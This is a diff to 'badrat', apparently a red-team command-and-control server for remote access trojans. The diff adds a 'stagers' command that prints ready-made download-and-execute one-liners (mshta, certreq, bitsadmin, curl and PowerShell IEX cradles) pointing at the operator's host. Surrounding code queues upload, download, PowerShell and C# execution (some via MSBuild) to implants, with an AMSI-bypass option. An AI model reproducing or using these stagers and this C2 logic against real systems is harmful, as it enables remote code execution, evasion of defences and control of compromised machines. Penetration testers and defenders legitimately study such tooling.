@@ -33,6 +33,9 @@ supported_types = ["c", "c#", "js", "ps1", "hta"]
 msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
 alpha = "abcdefghijklmnopqrstuvwxyz"
 
+# Generate a random path to serve payloads off of
+rand_path = ''.join(random.choice(alpha) for choice in range(10)) 
+
 # Only applies to hta and js rats
 prepend_amsi_bypass_to_psh = True
 
@@ -45,7 +48,7 @@ usernames = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear']
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers']
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -224,10 +227,7 @@ def default_page():
     return(htmlify(message))
 
 # Allow rats to call home and request more ratcode of their own type
-# Or send ad-hoc ratcode from the server. Examples of ad-hoc commands:
-# C:\ > certreq -Post -config http://192.168.0.189:8080/kqkianehiz/b.js c:\windows\win.ini a.txt & wscript /e:jscript a.txt
-# C:\ > mshta http://192.168.0.189:8080/kqkianehiz/b.hta
-# PS C:\ > (new-object net.webclient).downloadstring('http://192.168.0.189:8080/kqkianehiz/b.ps1')|IEX
+# Or send ad-hoc (stager) ratcode from the server.
 def send_ratcode(ratID=None, ratType=None):
     if(ratType): # Ad hoc ratcode send
         pretty_print("[*] Sending ad-hoc " + colors(ratType) + " ratcode")
@@ -429,7 +429,6 @@ def serve_server(port=8080):
     if(verbose):
         pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
 
-    rand_path = ''.join(random.choice(alpha) for choice in range(10)) 
     pretty_print("[*] Ad-Hoc ratcode servable from path: " + colors("/" + rand_path + "/b.<rat_type>") + " via GET or POST")
 
     # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
@@ -441,6 +440,34 @@ def serve_server(port=8080):
         pretty_print("[*] Starting " + colors("HTTP") + " listener on port " + str(port) + "\n\n")
         app.run(host="0.0.0.0", port=port)
 
+# C:\ > certreq -Post -config http://192.168.0.189:8080/kqkianehiz/b.js c:\windows\win.ini a.txt & wscript /e:jscript a.txt
+# C:\ > mshta http://192.168.0.189:8080/kqkianehiz/b.hta
+# PS C:\ > (new-object net.webclient).downloadstring('http://192.168.0.189:8080/kqkianehiz/b.ps1')|IEX
+def get_stagers(lhost):
+    protocol = "http"
+    if(ssl):
+        protocol = "https"
+    url = protocol + "://" + lhost + ":" + str(port) + "/" + rand_path + "/b." # Needs rat type at the end
+    pretty_print("")
+    pretty_print("[*] Webserver serving ratcode on: " + colors("/" + rand_path + "/b.<rat_type>") + " on port " + str(port) + " (HTTP POST and GET only)")
+    pretty_print("================================================================================================")
+    pretty_print("")
+    pretty_print("    " + colors("hta") + ":")
+    pretty_print("  mshta " + url + "hta")
+    pretty_print("")
+    pretty_print("    " + colors("js") + ":")
+    pretty_print("  certreq -Post -config " + url + "js c:\windows\win.ini a.txt & wscript /e:jscript a.txt")
+    pretty_print("  curl.exe " + url + "js -o a.txt & wscript /e:jscript a.txt")
+    pretty_print("  bitsadmin /transfer yeet /download /priority high " + url + "js %temp%\\a.js & timeout /t 1 & wscript %temp%\\a.js")
+    pretty_print("  echo var a = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");a.Open(\"GET\", \"" + url + "js\");a.Send();eval(a.ResponseText) > a.js & wscript a.js")
+    pretty_print("")
+    pretty_print("    " + colors("ps1") + ":")
+    pretty_print("  (new-object net.webclient).downloadstring('" + url + "ps1')|IEX")
+    pretty_print("  (iwr -UseBasicParsing " + url + "ps1).Content|IEX")
+    pretty_print('  $ExecutionContext.InvokeCommand.InvokeScript([net.webclient]::new().DownloadString("' + url + 'ps1"))')
+    pretty_print('  [Scriptblock]::Create([net.webclient]::new().DownloadString("' + url + 'ps1")).invoke()')
+    pretty_print('  [Management.Automation.PowerShell]::Create().addscript([net.webclient]::new().DownloadString("' + url + 'ps1")).invoke()')
+    pretty_print("")
 
 def get_rats(current=""):
     pretty_print("\n    implant id \ttype\tcheck-in\tusername")
@@ -521,118 +548,136 @@ if __name__ == "__main__":
 
     # Badrat main menu loop
     while True:
-        prompt = colors("Badrat") + " //> "
-        inp = input(prompt)
+        try:
+            prompt = colors("Badrat") + " //> "
+            inp = input(prompt)
 
-        # Check if input has a trailing space, like 'exit ' instead of 'exit' -- for tab completion
-        inp = inp.rstrip()
+            # Check if input has a trailing space, like 'exit ' instead of 'exit' -- for tab completion
+            inp = inp.rstrip()
 
-        # Check if the operator wants to quit badrat
-        if(inp == "exit"):
-            pretty_print("[*] Shutting down badrat listener")
-            sys.exit()
+            # Check if the operator wants to quit badrat
+            if(inp == "exit"):
+                pretty_print("[*] Shutting down badrat listener")
+                sys.exit()
 
-        # Gets the help info
-        elif(inp == "help"):
-            get_help()
+            # Gets the help info
+            elif(inp == "help"):
+                get_help()
 
-        # View rats, their types, and their latest checkin times
-        elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
-            get_rats()
+            elif(str.startswith(inp, "stagers")):
+                try:
+                    lhost = inp.split(" ")[1]
+                    get_stagers(lhost)
+                except:
+                    pretty_print("Usage: stagers <LHOST IP or domain name>")
 
-        # Remove rats -- either by ratID or all
-        elif(str.startswith(inp, "remove")):
-            try:
-                remove_rat(inp.split(" ")[1])
-            except:
-                pretty_print("invalid syntax: Use 'remove <ratID>' or 'remove all'")
+            # View rats, their types, and their latest checkin times
+            elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
+                get_rats()
 
-        # Clear the screen
-        elif(inp == "clear"):
-            os.system("clear")
+            # Remove rats -- either by ratID or all
+            elif(str.startswith(inp, "remove")):
+                try:
+                    remove_rat(inp.split(" ")[1])
+                except:
+                    pretty_print("invalid syntax: Use 'remove <ratID>' or 'remove all'")
 
-        # Enter rat specific command prompt
-        elif(inp in rats.keys() or inp == "all"):
-            ratID = inp
+            # Clear the screen
+            elif(inp == "clear"):
+                os.system("clear")
 
-            # Interact-with-rat loop
-            while True:
-                prompt = colors(ratID) + " \\\\> "
-                inp = input(prompt)
+            # Enter rat specific command prompt
+            elif(inp in rats.keys() or inp == "all"):
+                ratID = inp
 
-                if(inp != ""):
-                    inp = inp.rstrip()
+                # Interact-with-rat loop
+                while True:
+                    prompt = colors(ratID) + " \\\\> "
+                    inp = input(prompt)
 
-                    if(inp == "back" or inp == "exit"):
-                        break
+                    if(inp != ""):
+                        inp = inp.rstrip()
 
-                    elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
-                        get_rats(ratID)
-                        continue
+                        if(inp == "back" or inp == "exit"):
+                            break
 
-                    elif(inp == "clear"):
-                        os.system("clear")
-                        continue
+                        elif(inp == "agents" or inp == "rats" or inp == "implants" or inp == "sessions"):
+                            get_rats(ratID)
+                            continue
 
-                    elif(inp == "help"):
-                        get_help()
-                        continue
+                        elif(inp == "clear"):
+                            os.system("clear")
+                            continue
 
-                    elif(inp == "quit"):
-                        inp = "quit"
+                        elif(inp == "help"):
+                            get_help()
+                            continue
 
-                    elif(inp == "spawn"):
-                        if(types[ratID] == "ps1" or types[ratID] == "hta"):
-                            inp = "spawn " + send_ratcode(ratID)
-
-                    elif(str.startswith(inp, "psh ")):
-                        try:
-                            filepath = inp.split(" ")[1]
-                            extra_cmds = ""
+                        elif(str.startswith(inp, "stagers")):
                             try:
-                                extra_cmds = " ".join(inp.split(" ")[2:])
+                                lhost = inp.split(" ")[1]
+                                get_stagers(lhost)
                             except:
-                                pass
-                            if(types[ratID] == "ps1" or types[ratID] == "c#"):
-                                inp = "psh " + create_psscript(filepath, extra_cmds)
-                            else:
-                                inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
-                        except:
-                            pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                pretty_print("Usage: stagers <LHOST IP or domain name>")
                             continue
 
-                    elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
-                        try:
-                            filepath = inp.split(" ")[1]
-                            if(types[ratID] == "ps1"):
-                                inp = "cs " + send_invoke_assembly(inp)
-                            elif(types[ratID] == "c#"):
-                                inp = "cs " + encode_file(filepath) + " " + parse_c_sharp_args(inp)
-                            else:
-                                inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
-                        except:
-                            pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
-                            continue
+                        elif(inp == "quit"):
+                            inp = "quit"
 
-                    elif(str.startswith(inp, "up ") or str.startswith(inp, "upload ")):
-                        try:
-                            localpath = inp.split(" ")[1]
-                            remotepath = inp.split(" ")[2] #BAD -- does not account for remote paths that contain space: "C:\Program Files\whatever.txt"
-                            remotepath = remotepath.replace("\\", "\\\\")
-                            inp = "up " + encode_file(localpath) + " " + remotepath
-                        except:
-                            pretty_print("[!] Could not open file " + colors(localpath) + " for reading or no remote path specified")
-                            continue
+                        elif(inp == "spawn"):
+                            if(types[ratID] == "ps1" or types[ratID] == "hta"):
+                                inp = "spawn " + send_ratcode(ratID)
 
-                    # Alias download=dl
-                    elif(str.startswith(inp, "dl ") or str.startswith(inp, "download ")):
-                        inp = " ".join(inp.split(" ")[1:])
-                        inp = "dl " + inp
+                        elif(str.startswith(inp, "psh ")):
+                            try:
+                                filepath = inp.split(" ")[1]
+                                extra_cmds = ""
+                                try:
+                                    extra_cmds = " ".join(inp.split(" ")[2:])
+                                except:
+                                    pass
+                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
+                                    inp = "psh " + create_psscript(filepath, extra_cmds)
+                                else:
+                                    inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
+                            except:
+                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                continue
 
-                    pretty_print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
-                    if(ratID == "all"):
-                    # update ALL commands
-                        for i in commands.keys():
-                            commands[i] = inp
-                    else:
-                        commands[ratID] = inp
+                        elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
+                            try:
+                                filepath = inp.split(" ")[1]
+                                if(types[ratID] == "ps1"):
+                                    inp = "cs " + send_invoke_assembly(inp)
+                                elif(types[ratID] == "c#"):
+                                    inp = "cs " + encode_file(filepath) + " " + parse_c_sharp_args(inp)
+                                else:
+                                    inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
+                            except:
+                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                continue
+
+                        elif(str.startswith(inp, "up ") or str.startswith(inp, "upload ")):
+                            try:
+                                localpath = inp.split(" ")[1]
+                                remotepath = inp.split(" ")[2] #BAD -- does not account for remote paths that contain space: "C:\Program Files\whatever.txt"
+                                remotepath = remotepath.replace("\\", "\\\\")
+                                inp = "up " + encode_file(localpath) + " " + remotepath
+                            except:
+                                pretty_print("[!] Could not open file " + colors(localpath) + " for reading or no remote path specified")
+                                continue
+
+                        # Alias download=dl
+                        elif(str.startswith(inp, "dl ") or str.startswith(inp, "download ")):
+                            inp = " ".join(inp.split(" ")[1:])
+                            inp = "dl " + inp
+
+                        pretty_print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
+                        if(ratID == "all"):
+                        # update ALL commands
+                            for i in commands.keys():
+                                commands[i] = inp
+                        else:
+                            commands[ratID] = inp
+        except KeyboardInterrupt:
+            pretty_print("[!] Caught Ctrl+C. Type 'exit' to quit badrat")
